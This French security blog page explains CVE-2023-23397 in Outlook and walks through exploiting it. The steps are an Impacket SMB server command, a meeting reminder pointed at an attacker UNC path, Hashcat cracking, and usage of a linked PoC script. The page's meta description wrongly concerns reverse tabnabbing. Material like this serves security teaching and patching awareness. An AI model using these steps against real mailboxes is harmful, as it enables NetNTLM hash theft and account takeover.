<!DOCTYPE html>
<html lang="fr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe. - Trackflaw | Expert en sécurité informatique</title><meta name="Description" content="Plongez dans les abysses du &#39;reverse tab nabbing&#39;, une technique de phishing redoutablement efficace. Découvrez comment les pirates informatiques exploitent astucieusement les onglets de votre navigateur pour vous rediriger vers des sites malveillants, tout en vous laissant croire que vous naviguez en toute sécurité sur vos sites familiers. À travers un scénario réaliste, nous vous montrons pas à pas comment cette attaque se déroule et soulignons les failles exploitables. Apprenez des mesures essentielles pour vous protéger, comme éviter l&#39;usage de l&#39;attribut target=_blank ou incorporer rel=noopener noreferrer. Cet article est un incontournable pour renforcer votre cybersécurité et déjouer les pièges du phishing moderne."><meta property="og:url" content="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/">
  <meta property="og:site_name" content="Trackflaw | Expert en sécurité informatique">
  <meta property="og:title" content="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.">
  <meta property="og:description" content="Plongez dans les abysses du &#39;reverse tab nabbing&#39;, une technique de phishing redoutablement efficace. Découvrez comment les pirates informatiques exploitent astucieusement les onglets de votre navigateur pour vous rediriger vers des sites malveillants, tout en vous laissant croire que vous naviguez en toute sécurité sur vos sites familiers. À travers un scénario réaliste, nous vous montrons pas à pas comment cette attaque se déroule et soulignons les failles exploitables. Apprenez des mesures essentielles pour vous protéger, comme éviter l&#39;usage de l&#39;attribut target=_blank ou incorporer rel=noopener noreferrer. Cet article est un incontournable pour renforcer votre cybersécurité et déjouer les pièges du phishing moderne.">
  <meta property="og:locale" content="fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-03-24T17:25:42+01:00">
    <meta property="article:modified_time" content="2023-03-24T17:25:42+01:00">
    <meta property="article:tag" content="Pwncloud">
    <meta property="article:tag" content="Pentest">
    <meta property="article:tag" content="Cloud">
    <meta property="og:image" content="http://localhost:1313/images/cve-outlook/CVE-2023-23397.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/images/cve-outlook/CVE-2023-23397.png"><meta name="twitter:title" content="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.">
<meta name="twitter:description" content="Plongez dans les abysses du &#39;reverse tab nabbing&#39;, une technique de phishing redoutablement efficace. Découvrez comment les pirates informatiques exploitent astucieusement les onglets de votre navigateur pour vous rediriger vers des sites malveillants, tout en vous laissant croire que vous naviguez en toute sécurité sur vos sites familiers. À travers un scénario réaliste, nous vous montrons pas à pas comment cette attaque se déroule et soulignons les failles exploitables. Apprenez des mesures essentielles pour vous protéger, comme éviter l&#39;usage de l&#39;attribut target=_blank ou incorporer rel=noopener noreferrer. Cet article est un incontournable pour renforcer votre cybersécurité et déjouer les pièges du phishing moderne.">
      <meta name="twitter:site" content="@trackflaw">
<meta name="application-name" content="Trackflaw | Expert en sécurité offensive">
<meta name="apple-mobile-web-app-title" content="Trackflaw | Expert en sécurité offensive"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" /><link rel="next" href="http://localhost:1313/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.",
        "inLanguage": "fr",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/rappel-de-r%C3%A9union-vous-veut-du-mal\/"
        },"image": ["http:\/\/localhost:1313\/images\/logo.png"],"genre": "posts","keywords": "Pwncloud, Pentest, Cloud","wordcount":  604 ,
        "url": "http:\/\/localhost:1313\/rappel-de-r%C3%A9union-vous-veut-du-mal\/","datePublished": "2023-03-24T17:25:42+01:00","dateModified": "2023-03-24T17:25:42+01:00","publisher": {
            "@type": "Organization",
            "name": "Thibaud Robin - Trackflaw","logo": "http:\/\/localhost:1313\/images\/logo.png"},"author": {
                "@type": "Person",
                "name": "Thibaud Robin"
            },"description": "Plongez dans les abysses du 'reverse tab nabbing', une technique de phishing redoutablement efficace. Découvrez comment les pirates informatiques exploitent astucieusement les onglets de votre navigateur pour vous rediriger vers des sites malveillants, tout en vous laissant croire que vous naviguez en toute sécurité sur vos sites familiers. À travers un scénario réaliste, nous vous montrons pas à pas comment cette attaque se déroule et soulignons les failles exploitables. Apprenez des mesures essentielles pour vous protéger, comme éviter l'usage de l'attribut target=_blank ou incorporer rel=noopener noreferrer. Cet article est un incontournable pour renforcer votre cybersécurité et déjouer les pièges du phishing moderne."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Articles"> Articles </a><a class="menu-item" href="/news/" title="Actualités"> Actualités </a><a class="menu-item" href="/about/" title="A propos"> A propos </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Choisir la langue">
                    <i class="fa fa-globe" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/rappel-de-r%C3%A9union-vous-veut-du-mal/" selected>Français</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Trackflaw | Expert en sécurité informatique"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/images/logo3.png"
        data-srcset="/images/logo3.png, /images/logo3.png 1.5x, /images/logo3.png 2x"
        data-sizes="auto"
        alt="/images/logo3.png"
        title="/images/logo3.png" />TRACKFLAW</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Rechercher des titres, des contenus..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Rechercher">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clair">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Annuler
                    </a>
                </div><a class="menu-item" href="/posts/" title="Articles">Articles</a><a class="menu-item" href="/news/" title="Actualités">Actualités</a><a class="menu-item" href="/about/" title="A propos">A propos</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Changer de thème">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Choisir la langue">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/rappel-de-r%C3%A9union-vous-veut-du-mal/" selected>Français</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contenu</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe.</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a href="https://www.linkedin.com/in/thibaud-robin/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="thibaud-picture-big" aria-hidden="true"></i>Thibaud Robin</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="24/03/2023">24/03/2023</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;604 mots&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/CVE-2023-23397.png"
        data-srcset="/images/cve-outlook/CVE-2023-23397.png, /images/cve-outlook/CVE-2023-23397.png 1.5x, /images/cve-outlook/CVE-2023-23397.png 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/CVE-2023-23397.png"
        title="Plongez dans les abysses du &#39;reverse tab nabbing&#39;, une technique de phishing redoutablement efficace. Découvrez comment les pirates informatiques exploitent astucieusement les onglets de votre navigateur pour vous rediriger vers des sites malveillants, tout en vous laissant croire que vous naviguez en toute sécurité sur vos sites familiers. À travers un scénario réaliste, nous vous montrons pas à pas comment cette attaque se déroule et soulignons les failles exploitables. Apprenez des mesures essentielles pour vous protéger, comme éviter l&#39;usage de l&#39;attribut target=_blank ou incorporer rel=noopener noreferrer. Cet article est un incontournable pour renforcer votre cybersécurité et déjouer les pièges du phishing moderne." /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contenu</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#découverte">Découverte</a></li>
    <li><a href="#détails-techniques">Détails techniques</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#pas-à-pas">Pas à pas</a></li>
        <li><a href="#poc-final">PoC final</a></li>
      </ul>
    </li>
    <li><a href="#automatisation">Automatisation</a></li>
    <li><a href="#risques-et-remédiations">Risques et remédiations</a></li>
    <li><a href="#vidéo">Vidéo</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="-le-rappel-de-réunion-qui-vous-veut-du-mal">⏰ Le rappel de réunion qui vous veut du mal</h1>
<h2 id="découverte">Découverte</h2>
<p>Le 14 mars 2023, la société <code>MdSec</code> publiait <a href="https://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/" target="_blank" rel="noopener noreffer ">un article</a> traitant d&rsquo;une nouvelle vulnérabilité corrigée dans la dernière mise à jour proposée par Microsoft.</p>
<p>La vulnérabilité était décrite de la façon suivante :</p>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Patch KB5005413<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">Microsoft Office Outlook contains a privilege escalation vulnerability that allows for a NTLM Relay attack against another service to authenticate as the user.</div>
        </div>
    </div>
<p>L&rsquo;analyse d&rsquo;un <a href="https://github.com/microsoft/CSS-Exchange/blob/a4c096e8b6e6eddeba2f42910f165681ed64adf7/docs/Security/CVE-2023-23397.md" target="_blank" rel="noopener noreffer ">script</a> d&rsquo;analyse fournit par Microsoft permet d&rsquo;obtenir quelques indices sur l&rsquo;exploitation de cette vulnérabilité.</p>
<h2 id="détails-techniques">Détails techniques</h2>
<p>Le script indique certains élements :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="cm">&lt;#
</span></span></span><span class="line"><span class="cl"><span class="cm">.</span><span class="sd">SYNOPSIS</span><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">    This script audits mails, calendar and task items and check if PidLidReminderFileParameter property is populated or not.
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$searchFilterPidLidReminderFileParameterExists</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">Exchange</span><span class="p">.</span><span class="py">WebServices</span><span class="p">.</span><span class="py">Data</span><span class="p">.</span><span class="n">SearchFilter</span><span class="p">+</span><span class="n">Exists</span><span class="p">(</span><span class="nv">$mailInfo</span><span class="p">[</span><span class="s2">&#34;PidLidReminderFileParameter&#34;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nv">$searchFilterCollection</span><span class="p">.</span><span class="py">Add</span><span class="p">(</span><span class="nv">$searchFilterPidLidReminderFileParameterExists</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="nv">$item</span><span class="p">.</span><span class="py">RemoveExtendedProperty</span><span class="p">(</span><span class="nv">$mailInfo</span><span class="p">[</span><span class="s2">&#34;PidLidReminderFileParameter&#34;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="p">(</span><span class="s2">&#34;Property already cleared on entry number: </span><span class="nv">$entryCount</span><span class="s2">, Line number: </span><span class="p">$(</span><span class="nv">$entryCount</span> <span class="p">+</span> <span class="mf">1</span><span class="p">)</span><span class="s2">&#34;</span><span class="p">)</span> <span class="n">-ForegroundColor</span> <span class="n">Yellow</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$invalidEntries</span><span class="p">.</span><span class="py">Add</span><span class="p">(</span><span class="nv">$entryCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">continue</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Le script recherche les emails contenant l&rsquo;attribut <code>PidLidReminderFileParameter</code>. Ce paramètre permet de contrôler la ressource jouée lors du rappel d&rsquo;une réunion.</p>
<p>Il est donc possible de conclure :</p>
<ul>
<li>Outlook souffre d&rsquo;un <strong>manque de contrôle sur la saisie de l&rsquo;utilisateur</strong> qui permet de configurer le son d&rsquo;un rappel de réunion et de rendez-vous.</li>
<li>L&rsquo;attaquant est effectuable sans aucune manipulation de la part de l&rsquo;utilisateur (vulnérabilité de type &ldquo;zero click&rdquo;).</li>
<li>L&rsquo;attaquant est capable de forcer une victime à établir une connexion avec son serveur afin de dérober son <strong>condensat NetNTLM</strong>.</li>
</ul>
<p>Un attaquant exploitant cette vulnérabilité récupère un condensé NetNTLMv2 basé sur le mot de passe de l&rsquo;utilisateur piégé via une requête SMB. La requête est déclenchée dès que le courrier arrive dans la boîte de réception.</p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="pas-à-pas">Pas à pas</h3>
<p>Pour exploiter cette faiblesse il est nécessaire d&rsquo;agir en plusieurs étapes.</p>
<p>Dans un premier temps, il faut ouvrir un serveur SMB afin de réceptionner le condensat NetNTLM tansmis par la victime (par exemple avec Impacket comme ci-dessous).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbserver.py -smb2support EXEGOL .
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/2023-09-12-17-23-49.png"
        data-srcset="/images/cve-outlook/2023-09-12-17-23-49.png, /images/cve-outlook/2023-09-12-17-23-49.png 1.5x, /images/cve-outlook/2023-09-12-17-23-49.png 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/2023-09-12-17-23-49.png"
        title="Serveur SMB" /></p>
<p>Une fois que le serveur est configuré, il faut configuré la réunion. Pour cela, il faut faire pointer le rappel de la réunion vers le serveur de l&rsquo;attaquant. Par exemple : <code>\\10.10.10.10\EXEGOL\</code> pour s&rsquo;adapter à la commande précédente.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/2023-09-12-17-25-33.png"
        data-srcset="/images/cve-outlook/2023-09-12-17-25-33.png, /images/cve-outlook/2023-09-12-17-25-33.png 1.5x, /images/cve-outlook/2023-09-12-17-25-33.png 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/2023-09-12-17-25-33.png"
        title="/images/cve-outlook/2023-09-12-17-25-33.png" /></p>
<p>Le rendez-vous positionné, son arrivée dans la boite mail de la victime déclenche l&rsquo;envoi d&rsquo;un condensat NetNTLMv2 vers le serveur de l&rsquo;attaquant.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/2023-09-12-17-27-15.png"
        data-srcset="/images/cve-outlook/2023-09-12-17-27-15.png, /images/cve-outlook/2023-09-12-17-27-15.png 1.5x, /images/cve-outlook/2023-09-12-17-27-15.png 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/2023-09-12-17-27-15.png"
        title="/images/cve-outlook/2023-09-12-17-27-15.png" /></p>
<p>Ce condensat a été créée à partir du mot de passe de la victime. Une attaque par force brute (ci-dessous avec <code>Hashcat</code>) à l&rsquo;aide d&rsquo;une liste de mot de passe adéquat permet de retrouver le mot de passe exfiltré.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/2023-09-12-17-29-19.png"
        data-srcset="/images/cve-outlook/2023-09-12-17-29-19.png, /images/cve-outlook/2023-09-12-17-29-19.png 1.5x, /images/cve-outlook/2023-09-12-17-29-19.png 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/2023-09-12-17-29-19.png"
        title="/images/cve-outlook/2023-09-12-17-29-19.png" /></p>
<h3 id="poc-final">PoC final</h3>
<p>Le PoC final est réalisable facilement.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/images/cve-outlook/poc.gif"
        data-srcset="/images/cve-outlook/poc.gif, /images/cve-outlook/poc.gif 1.5x, /images/cve-outlook/poc.gif 2x"
        data-sizes="auto"
        alt="/images/cve-outlook/poc.gif"
        title="/images/cve-outlook/poc.gif" /></p>
<h2 id="automatisation">Automatisation</h2>
<p>Ce type d&rsquo;exploit est facilement automatisable. Un PoC est disponible sur le GitHub de Trackflaw : <a href="https://github.com/Trackflaw/CVE-2023-23397" target="_blank" rel="noopener noreffer ">https://github.com/Trackflaw/CVE-2023-23397</a></p>
<p>Ce PoC agit en plusieurs étapes :</p>
<ol>
<li>Il créé un fichier <code>.msg</code> pointant vers le serveur de l&rsquo;attaquant.</li>
<li>Ce fichier de réunion est mis en pièce jointe d&rsquo;un email.</li>
<li>L&rsquo;email est transmis à la victime.</li>
</ol>
<p>Utilisation du PoC</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">23397.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">usage</span><span class="p">:</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">23397.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="o">-</span><span class="n">p</span> <span class="n">PATH</span>
</span></span><span class="line"><span class="cl"><span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">23397.</span><span class="n">py</span><span class="p">:</span> <span class="n">error</span><span class="p">:</span> <span class="n">the</span> <span class="n">following</span> <span class="n">arguments</span> <span class="n">are</span> <span class="n">required</span><span class="p">:</span> <span class="o">-</span><span class="n">p</span><span class="o">/--</span><span class="n">path</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">python</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mf">23397.</span><span class="n">py</span> <span class="o">--</span><span class="n">path</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">yourip</span><span class="se">\&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="risques-et-remédiations">Risques et remédiations</h2>
<p>Les risques pour ce type de vulnérabilité sont nombreux. Un attaquant est en mesure de réaliser un certains nombre d&rsquo;actions malveillantes :</p>
<ul>
<li>Retrouver le mot de passe de l&rsquo;utilisateur.</li>
<li>Transmettre le condensat afin de s&rsquo;authentifier à la place de l&rsquo;utilisateur.</li>
<li>Accéder à des ressources réseaux.</li>
<li>Usurper des identités.</li>
<li>Compromettre des serveurs et des stations de travail.</li>
<li>Etc</li>
</ul>
<p>Afin de se protéger contre cette vulnérabilité, Microsoft a publié un correctif disponible depuis plusieurs jours avant la publication du premier PoC officiel.</p>
<h2 id="vidéo">Vidéo</h2>
<p>Enfin, une vidéo plus détaillée est disponible sur la chaine YouTube de Trackflaw.</p>


    
    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube-nocookie.com/embed/6bhJPwFgs8Q?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
      ></iframe>
    </div>

</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Mis à jour le 24/03/2023</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/rappel-de-r%C3%A9union-vous-veut-du-mal/index.md" target="_blank">Lire Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" data-title="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe." data-via="trackflaw" data-hashtags="Pwncloud,Pentest,Cloud"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" data-hashtag="Pwncloud"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" data-title="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe."><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Line" data-sharer="line" data-url="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" data-title="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe."><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur 微博" data-sharer="weibo" data-url="http://localhost:1313/rappel-de-r%C3%A9union-vous-veut-du-mal/" data-title="CVE-2023-23397 - La réunion Outlook qui exfiltre votre mot de passe." data-image="/images/cve-outlook/CVE-2023-23397.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/pwncloud/">Pwncloud</a>,&nbsp;<a href="/tags/pentest/">Pentest</a>,&nbsp;<a href="/tags/cloud/">Cloud</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
        </section>
    </div>

    <div class="post-nav">
            <a href="/comment-contourner-d%C3%A9p%C3%B4t-fichiers/" class="next" rel="next" title="Htaccess, ou comment contourner les mécanismes de dépôt de fichiers.">Htaccess, ou comment contourner les mécanismes de dépôt de fichiers.<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Trackflaw</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Remonter en haut">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="Afficher les commentaires">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.fr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Ok !","link":"En savoir plus","message":"Trackflaw utilise des cookies pour améliorer votre expérience et effectuer des 